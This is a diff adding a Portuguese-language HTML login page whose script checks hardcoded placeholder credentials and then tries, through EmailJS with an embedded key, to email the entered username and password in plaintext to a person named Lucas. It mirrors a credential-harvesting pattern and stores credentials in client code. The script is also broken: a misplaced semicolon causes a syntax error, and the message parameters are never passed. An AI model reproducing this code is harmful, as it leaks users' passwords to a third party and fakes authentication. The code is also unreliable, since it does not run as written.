@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Página de Login</title>
+  <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+</head>
+
+<body>
+  <div class="login-box">
+    <h2>Login</h2>
+    <form id="login-form">
+      <div class="user-box">
+        <input type="text" id="username" required="">
+        <label>Usuário</label>
+      </div>
+      <div class="user-box">
+        <input type="password" id="password" required="">
+        <label>Senha</label>
+      </div>
+      <button type="submit" id="login-button">Entrar</button>
+    </form>
+  </div>
+
+  <script>
+    document.getElementById('login-form').addEventListener('submit', function(event) {
+      event.preventDefault();
+      
+      // Obtenha os valores de usuário e senha
+      const username = document.getElementById('username').value;
+      const password = document.getElementById('password').value;
+
+      // Aqui você pode adicionar a lógica para autenticação do usuário
+      // Verifique se o usuário e a senha inseridos correspondem aos valores fornecidos.
+
+      const isValid = username === 'seu_usuario' && password === 'sua_senha';
+
+      if (isValid) {
+        // Chame a função para enviar o e-mail
+        sendEmail(username, password);
+      }
+    });
+
+    function sendEmail(username, password) {
+      // Configurar o serviço EmailJS
+      emailjs.init("nPwRE9fJy-Z9VPR9X");
+
+     
+      var template_params = {
+        "from_name": "lucas",
+        "to_name": "Lucas",
+        "subject": "Novo Login",
+        "message_html": `Usuário: ${username}, Senha: ${password}`
+      }
+
+      // Enviar o e-mail
+      emailjs.send ( " service_qcgku3l " , " template_gzouayd " ) ;
+        .then(function(response) {
+          console.log('E-mail enviado com sucesso:', response);
+        }, function(error) {
+          console.log('Erro ao enviar o e-mail:', error);
+        });
+    }
+  </script>
+</body>
+
+</html>
